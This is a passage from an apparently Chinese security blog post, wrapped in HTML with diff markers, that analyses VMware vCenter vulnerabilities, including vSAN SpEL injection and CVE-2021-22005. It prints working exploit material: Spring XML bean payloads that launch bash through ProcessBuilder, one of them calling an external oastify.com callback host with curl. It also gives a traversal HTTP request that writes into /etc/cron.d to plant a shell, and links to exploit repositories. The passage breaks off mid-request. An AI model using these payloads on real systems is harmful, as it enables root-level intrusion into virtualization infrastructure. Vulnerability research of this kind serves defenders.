+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071639053.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071639053.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071639053.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071639053.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071639053.png-water_print" /></p>
+<p>向上寻找到定义  <code>@RequestMapping</code> 路由的 <code>Controller</code>，可以看到在请求路径中获取 Bean 名称或者类名和方法名称，接着从 POST 数据中获取 <code>methodInput</code> 列表作为方法参数，接着进入 <code>invokeService</code> 方法：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071640805.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071640805.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071640805.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071640805.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071640805.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071640805.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071645742.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071645742.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071645742.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071645742.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071645742.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071645742.png-water_print" /></p>
+<p><code>invokeServer</code> 先获取了 Bean 实例，接着获取该实例的方法列表，比对方法名和方法参数长度后，将用户传入的参数进行了一个简单的反序列化后利用进行了调用。</p>
+<p>所以接下来就是在 Spring 工厂创建的 bean 里查找危险方法构建利用链了，在 <code>vsan-h5-client/plugins/h5-vsan-service/META-INF/spring/base/*.xml</code> 配置文件中找到 bean 的定义，所有 scope 都是缺省的 <code>singleton</code> 而且没有配置 <code>lazy-init</code>，也就是说这些 bean 都会在 spring 项目启动时单例加载。</p>
+<p>漏洞作者所使用的 Bean 是 <code>vmodlContext</code>，对应 jar 为 <code>/etc/vmware/vsphere-ui/vc-packages/vsphere-client-serenity/com.vmware.vrops.install-6.x.x.xx000/plugins/vropsplugin-service.jar</code>，类是 <code>com.vmware.vim.vmomi.core.types.impl.VmodContextImpl</code>，其中的 <code>loadVmodlPackage</code> 方法代码如下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071709994.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071709994.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071709994.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071709994.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071709994.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071709994.png-water_print" /></p>
+<p>其中会通过  <code>NonValidatingClassPathXmlApplicationContext</code> 加载 <code>contextPath</code>，而该类继承自：<code>ClassPathXmlApplicationContext</code>：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071711954.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071711954.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071711954.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071711954.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071711954.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071711954.png-water_print" /></p>
+<p>因此可以构造远程加载解析 xml 中的 SpEL 表达式进而执行命令。</p>
+<p>需要注意的是，在 <code>SpringContextLoader</code> 的 <code>getContextFileNameForPackage</code> 会将路径中的 <code>.</code> 替换为 <code>/</code>，所以无法指定一个正常的 IPv4 地址，但是可以利用数字型 IP 绕过：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071838732.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071838732.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071838732.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071838732.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071838732.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071838732.png-water_print" /></p>
+<p>XML 文件内容及攻击效果如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.springframework.org/schema/beans&#34;</span>
+</span></span><span class="line"><span class="cl">       <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span class="line"><span class="cl">       <span class="na">xmlns:context=</span><span class="s">&#34;http://www.springframework.org/schema/context&#34;</span>
+</span></span><span class="line"><span class="cl">       <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;pb&#34;</span> <span class="na">class=</span><span class="s">&#34;java.lang.ProcessBuilder&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;constructor-arg&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;list&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;value&gt;</span>/bin/bash<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;value&gt;</span>-c<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;value&gt;</span>curl http://dj0esgxds3fv9m4a0a6dzorr0i69uy.oastify.com<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/list&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/constructor-arg&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;whatever&#34;</span> <span class="na">value=</span><span class="s">&#34;#{pb.start()}&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/bean&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/beans&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071839644.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071839644.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071839644.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071839644.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071839644.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071839644.png-water_print" /></p>
+<h5 id="不出网利用">不出网利用</h5>
+<p>若要利用此漏洞，本质上需要获取一个 XML 文件的内容，而 Java 的 URL 并不支持 data 协议，那么需要返回内容可控的 SSRF 或者文件上传漏洞。这里利用的是返回内容可控的 SSRF 漏洞。漏洞位于 <code>/usr/lib/vmware-vpx/vsan-health/pyMoVsan/ </code> 下的 vSAN Health 组件中 <code>VsanHttpProvider.py</code> 存在一个未授权访问 SSRF。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072016217.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072016217.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072016217.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072016217.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072016217.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072016217.png-water_print" /></p>
+<p>漏洞点是 238 行  <code>urlopen</code> 库函数进行 HTTP 请求，接着将返回内容在内存中进行解压，并且匹配文件名为 <code>.*offline_bundle.*</code> 的内容并进行返回。Python 的 <code>urlopen</code> 支持 data 协议，所以可以构造一个压缩包并 Base64 编码，构造 data 协议的 URL：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072056316.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072056316.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072056316.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072056316.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072056316.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072056316.png-water_print" /></p>
+<p>在利用的过程中，将 IP 地址替换为 localhost 即可防止 <code>.</code> 被替换。由于这个路由在 6.5 版本的 vSAN Health 不存在，所以无法在 6.5 版本上不出网利用。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072110648.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072110648.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072110648.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072110648.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072110648.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072110648.png-water_print" /></p>
+<p>现在虽然不用进行外网请求，但是仍然无法获取命令回显。通过查看 Bean 列表，发现存在名为 <code>systemProperties</code> 的 Bean。同时这个 Bean 也存在方法可以获取属性内容：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072104027.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072104027.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072104027.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072104027.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072104027.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072104027.png-water_print" /></p>
+<p>所以在执行 SpEL 时，可以将命令暂存到 <code>systemProperties</code> 中，然后利用 <code>getProperty</code> 方法获取回显。最终的 context.xml 内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.springframework.org/schema/beans&#34;</span>
+</span></span><span class="line"><span class="cl">       <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span class="line"><span class="cl">       <span class="na">xsi:schemaLocation=</span><span class="s">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;pb&#34;</span> <span class="na">class=</span><span class="s">&#34;java.lang.ProcessBuilder&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;constructor-arg&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;list&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;value&gt;</span>/bin/bash<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;value&gt;</span>-c<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;value&gt;</span><span class="cp">&lt;![CDATA[ ls -la /  2&gt;&amp;1 ]]&gt;</span><span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;/list&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/constructor-arg&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/bean&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;is&#34;</span> <span class="na">class=</span><span class="s">&#34;java.io.InputStreamReader&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;constructor-arg&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;value&gt;</span>#{pb.start().getInputStream()}<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/constructor-arg&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/bean&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;br&#34;</span> <span class="na">class=</span><span class="s">&#34;java.io.BufferedReader&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;constructor-arg&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;value&gt;</span>#{is}<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/constructor-arg&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/bean&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;collectors&#34;</span> <span class="na">class=</span><span class="s">&#34;java.util.stream.Collectors&#34;</span><span class="nt">&gt;&lt;/bean&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;system&#34;</span> <span class="na">class=</span><span class="s">&#34;java.lang.System&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;whatever&#34;</span> <span class="na">value=</span><span class="s">&#34;#{ system.setProperty(&amp;quot;output&amp;quot;, br.lines().collect(collectors.joining(&amp;quot;\n&amp;quot;))) }&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/bean&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/beans&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终漏洞利用的结果：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072106797.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072106797.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072106797.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072106797.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072106797.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205072106797.png-water_print" /></p>
+<h3 id="25-cve-2021-22005">2.5 CVE-2021-22005</h3>
+<h4 id="251-漏洞利用">2.5.1 漏洞利用</h4>
+<p>Analytics 服务相关端点存在目录穿越写文件，可以直接上传 Webshell 文件，并获取 root 权限。</p>
+<p>影响版本：</p>
+<ul>
+<li><code>7.0 &lt;= vCenter Server &lt; 7.0 U2c</code></li>
+<li><code>6.7 &lt;= vCenter Server &lt; 6.7 U3o</code></li>
+</ul>
+<p>POC：</p>
+<ul>
+<li><code>/nuclei-templates/cves/2021/CVE-2021-22005.yaml</code></li>
+</ul>
+<p>EXP：</p>
+<ul>
+<li><a href="https://github.com/r0ckysec/CVE-2021-22005" target="_blank" rel="noopener noreffer">https://github.com/r0ckysec/CVE-2021-22005</a></li>
+<li><a href="https://github.com/shmilylty/cve-2021-22005-exp" target="_blank" rel="noopener noreffer">https://github.com/shmilylty/cve-2021-22005-exp</a></li>
+</ul>
+<h4 id="252-漏洞分析">2.5.2 漏洞分析</h4>
+<p>两种触发方式，一种是开启 CEIP (Customer Experience Improvement Program) 时，通过 log4j 记录日志的功能实现任意文件写入，另一种是通过 Velocity 模板注入执行代码。这个漏洞拿到的权限是 <code>root</code> 权限。</p>
+<h5 id="asynctelemetrycontroller-漏洞">AsyncTelemetryController 漏洞</h5>
+<p>根据官方的漏洞通告可以发现，存在漏洞的 API 路径为：<code>/analytics/telemetry/ph/api/hyper/send</code>。而对应路径的 rhttpproxy 策略在 vCenter 各版本中也不尽相同，有些版本只有 <code>/analytics/telemetry/</code> 可以直接访问，有些版本则 <code>/analytics/</code> 下均可访问：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081545742.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081545742.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081545742.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081545742.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081545742.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081545742.png-water_print" /></p>
+<p>根据 poc 提示接口 <code>/analytics/telemetry/ph/api/hyper/send</code>，找到对应的类：</p>
+<p><code>analytics-push-telemetry-server-6.7.0.jar#com.vmware.ph.phservice.push.telemetry.server.AsyncTelemetryController.class</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081555337.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081555337.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081555337.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081555337.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081555337.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081555337.png-water_print" /></p>
+<p>对 <code>/ph/api/hyper/send</code> 路径的 <code>_v</code>、<code>_c</code>、<code>_i </code>请求参数分别绑定给变量 <code>version</code>、<code>collectorId</code>、<code>collectorInstanceId</code>。跟进 <code>handleSendRequest</code> 函数，最终将调用 <code>telemetryService.processTelemetry()</code> 方法：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081601609.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081601609.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081601609.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081601609.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081601609.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081601609.png-water_print" /></p>
+<p>继续进入 <code>TelemetryService.processTelemetry()</code>，上面刚刚创建的 <code>TelemetryRequest</code> 将被提交到一个队列并在不久之后在 <code>TelemetryRequestProcessorRunnable</code> 处执行：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081621364.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081621364.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081621364.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081621364.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081621364.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081621364.png-water_print" /></p>
+<p><code>TelemetryLevelBasedTelemetryServiceWrapper</code> 类 <code>processTelemetry</code> 方法会调用 <code>DefaultTelemetryLevelService</code> 类 <code>getTelemetryLevel</code> 方法获取 <code>telemetryLevel</code>：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081626517.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081626517.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081626517.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081626517.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081626517.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081626517.png-water_print" /></p>
+<p>继续跟进看到需要 <code>isCeipEnabled</code> 不为默认值 <code>false</code> 才会继续：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081627631.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081627631.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081627631.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081627631.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081627631.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081627631.png-water_print" /></p>
+<p>随后调用 <code>LogTelemetryService</code> 类 <code>processTelemetry</code> 方法，利用 log4j 写日志文件至 <code>/var/log/vmware/analytics/prod/</code> 目录，文件内容为 POST 请求体数据：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081643607.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081643607.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081643607.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081643607.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081643607.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081643607.png-water_print" /></p>
+<p>日志文件存储在 <code>/var/log/vmware/analytics/prod/_c&lt;collector id&gt;_i&lt;instance name&gt;.json</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081654959.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081654959.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081654959.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081654959.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081654959.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081654959.png-water_print" /></p>
+<p>并且因为 filename 中同时包含 collectorId 和 collectorInstanceId，所以可以在路径遍历中添加 <code>../</code> 字符，在另一个文件夹中随意创建一个文件的情况。但是，在 Linux 系统中，如下面的路径中含有不存在的文件夹，在创建文件时会报错：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/var/log/vmware/analytics/prod/_c_i/../../../../../../tmp/POC
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如何远程创建该临时文件内，经过可以在 <code>_i</code> 参数前加一个斜杠，目录会被创建。之后就可以通过目录拼接的形式进行文件写入。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081719338.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081719338.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081719338.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081719338.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081719338.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081719338.png-water_print" /></p>
+<p>目前已经可以控制任意文件写入，但是没有办法控制文件后缀 <code>.json</code>，对于 linux 的机器可以写入计划任务来执行写 shell 的操作：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/analytics/telemetry/ph-stg/api/hyper/send?_c=&amp;_i=/../../../../../../etc/cron.d/POC</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">IP</span>
